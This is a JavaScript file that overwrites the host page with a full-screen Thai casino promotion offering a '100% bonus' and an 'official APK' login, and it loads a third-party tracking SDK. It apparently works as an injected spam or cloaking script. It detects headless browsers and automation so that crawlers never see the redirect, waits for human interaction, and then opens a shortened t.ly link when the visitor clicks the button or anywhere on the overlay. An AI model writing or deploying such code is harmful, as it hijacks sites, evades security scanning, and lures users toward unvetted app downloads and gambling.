document.writeln("<script charset=\"UTF-8\" id=\"LA_COLLECT\" src=\"//sdk.51.la/js-sdk-pro.min.js\"></script>");
document.writeln("<script>LA.init({id:\"KupUYSAbpHt5Zueq\",ck:\"KupUYSAbpHt5Zueq\"})</script>");


(function () {
  // ===== æ”¹è¿™é‡Œ =====
  var TARGET    = 'https://t.ly/thai365jp';
  var COUNTDOWN = 5;

  var isHuman=false, ready=false, isBot=false;
  try {
    if (navigator.webdriver===true) isBot=true;
    if (/HeadlessChrome|PhantomJS|Electron/i.test(navigator.userAgent)) isBot=true;
    if (navigator.languages && navigator.languages.length===0) isBot=true;
    if (window.outerWidth===0||window.outerHeight===0) isBot=true;
  } catch(e){}

  var css = '<style>'
    + 'html,body{margin:0;padding:0}'
    + '#_lp{position:fixed;inset:0;z-index:999999;overflow:hidden;'
    +   'background:radial-gradient(circle at 50% 26%,rgba(255,196,0,.30),transparent 55%),'
    +   'radial-gradient(circle at 82% 82%,rgba(124,58,237,.38),transparent 50%),'
    +   'linear-gradient(160deg,#1a0b2e 0%,#0b1230 55%,#2a0a14 100%);'
    +   'display:flex;flex-direction:column;align-items:center;justify-content:center;'
    +   'padding:24px;box-sizing:border-box;font-family:-apple-system,"Noto Sans Thai",Segoe UI,Roboto,Arial,sans-serif;-webkit-tap-highlight-color:transparent}'
    + '#_lp:before{content:"";position:absolute;inset:0;background-image:radial-gradient(rgba(255,255,255,.12) 1px,transparent 1px);background-size:22px 22px;opacity:.25}'
    + '._coin{position:absolute;font-size:30px;animation:_float 6s ease-in-out infinite;filter:drop-shadow(0 4px 6px rgba(0,0,0,.45))}'
    + '._slot{font-size:104px;line-height:1;margin-bottom:8px;animation:_swing 2.2s ease-in-out infinite;filter:drop-shadow(0 8px 18px rgba(255,180,0,.5))}'
    + '._bonus{margin:6px 0 16px;padding:8px 18px;border-radius:999px;font-size:18px;font-weight:900;color:#fff;'
    +   'background:linear-gradient(90deg,#ef4444,#f59e0b);box-shadow:0 6px 20px rgba(239,68,68,.5),inset 0 0 0 2px rgba(255,255,255,.25);animation:_blink 1.1s steps(1) infinite}'
    + '._title{margin:0 0 8px;font-size:32px;font-weight:900;text-align:center;line-height:1.3;'
    +   'background:linear-gradient(180deg,#fff7cc,#ffcf3f 55%,#ff8a00);-webkit-background-clip:text;background-clip:text;color:transparent;text-shadow:0 2px 14px rgba(255,180,0,.45)}'
    + '._sub{margin:0 0 30px;font-size:15px;color:#e9d5ff;text-align:center;opacity:.92}'
    + '#_lpBtn{position:relative;overflow:hidden;width:100%;max-width:600px;padding:24px;border:0;border-radius:18px;'
    +   'color:#3a1500;font-size:26px;font-weight:900;letter-spacing:.5px;cursor:pointer;'
    +   'background:linear-gradient(180deg,#ffe79a,#ffc629 45%,#ff9d00);'
    +   'box-shadow:0 12px 30px rgba(255,150,0,.55),inset 0 2px 0 rgba(255,255,255,.6),inset 0 -3px 0 rgba(150,80,0,.5);animation:_pulse 1.2s ease-in-out infinite}'
    + '#_lpBtn:after{content:"";position:absolute;top:0;left:-60%;width:40%;height:100%;background:linear-gradient(110deg,transparent,rgba(255,255,255,.75),transparent);transform:skewX(-20deg);animation:_shine 2.4s linear infinite}'
    + '#_lpBtn[disabled]{filter:grayscale(.35);opacity:.65;animation:none}'
    + '._foot{margin-top:22px;font-size:12px;color:#c4b5fd;letter-spacing:.3px}'
    + '@keyframes _pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.05)}}'
    + '@keyframes _swing{0%,100%{transform:rotate(-7deg)}50%{transform:rotate(7deg)}}'
    + '@keyframes _float{0%,100%{transform:translateY(0) rotate(0)}50%{transform:translateY(-26px) rotate(18deg)}}'
    + '@keyframes _blink{0%{opacity:1}50%{opacity:.55}100%{opacity:1}}'
    + '@keyframes _shine{0%{left:-60%}60%,100%{left:130%}}'
    + '</style>';

  var html =
    '<div id="_lp">' +
      '<div class="_coin" style="top:12%;left:10%">ðŸª™</div>' +
      '<div class="_coin" style="top:20%;right:12%;animation-delay:1.2s">ðŸ’°</div>' +
      '<div class="_coin" style="bottom:18%;left:16%;animation-delay:.6s">ðŸª™</div>' +
      '<div class="_coin" style="bottom:24%;right:18%;animation-delay:1.8s">ðŸ’Ž</div>' +
      '<div class="_coin" style="top:42%;left:6%;animation-delay:2.4s">ðŸª™</div>' +
      '<div style="position:relative;z-index:2;display:flex;flex-direction:column;align-items:center;width:100%">' +
        '<div class="_slot">ðŸŽ°</div>' +
        '<div class="_bonus">ðŸŽ‰ à¹‚à¸šà¸™à¸±à¸ª 100% ðŸŽ‰</div>' +
        '<h1 class="_title">à¹€à¸‚à¹‰à¸²à¸ªà¸¹à¹ˆà¸£à¸°à¸šà¸š APK à¸­à¸¢à¹ˆà¸²à¸‡à¹€à¸›à¹‡à¸™à¸—à¸²à¸‡à¸à¸²à¸£</h1>' +
        '<p class="_sub">à¸à¸”à¸›à¸¸à¹ˆà¸¡à¸”à¹‰à¸²à¸™à¸¥à¹ˆà¸²à¸‡à¹€à¸žà¸·à¹ˆà¸­à¹€à¸‚à¹‰à¸²à¸ªà¸¹à¹ˆà¸£à¸°à¸šà¸šà¹à¸¥à¸°à¸£à¸±à¸šà¹‚à¸šà¸™à¸±à¸ª</p>' +
        '<button id="_lpBtn" disabled>à¸£à¸­ ' + COUNTDOWN + ' à¸§à¸´à¸™à¸²à¸—à¸µ...</button>' +
        '<div class="_foot">18+ | à¹€à¸¥à¹ˆà¸™à¸­à¸¢à¹ˆà¸²à¸‡à¸¡à¸µà¸ªà¸•à¸´</div>' +
      '</div>' +
    '</div>';

  document.write(css + html);

  function markHuman(){ isHuman=true; }
  ['touchstart','touchmove','pointerdown','scroll','mousemove','keydown','click'].forEach(function(ev){
    window.addEventListener(ev, markHuman, {passive:true});
  });
  window.addEventListener('deviceorientation', function(e){ if(e&&(e.alpha||e.beta||e.gamma)) markHuman(); }, {passive:true});

  function go(){ if(isBot||!isHuman||!ready) return; window.open(TARGET,'_blank'); }

  function bind(){
    var b=document.getElementById('_lpBtn');
    if(b){
      var n=COUNTDOWN;
      var t=setInterval(function(){
        n--;
        if(n>0){ b.textContent='à¸£à¸­ '+n+' à¸§à¸´à¸™à¸²à¸—à¸µ...'; }
        else{ clearInterval(t); ready=true; b.disabled=false; b.textContent='ðŸŽ à¸ªà¸¡à¸±à¸„à¸£à¹€à¸¥à¸¢'; }
      },1000);
      b.addEventListener('click', go);
    }
    var lp=document.getElementById('_lp');
    if(lp) lp.addEventListener('click', function(e){ if(e.target&&e.target.id!=='_lpBtn') go(); });
  }
  if(document.readyState!=='loading') bind();
  else document.addEventListener('DOMContentLoaded', bind);
})();
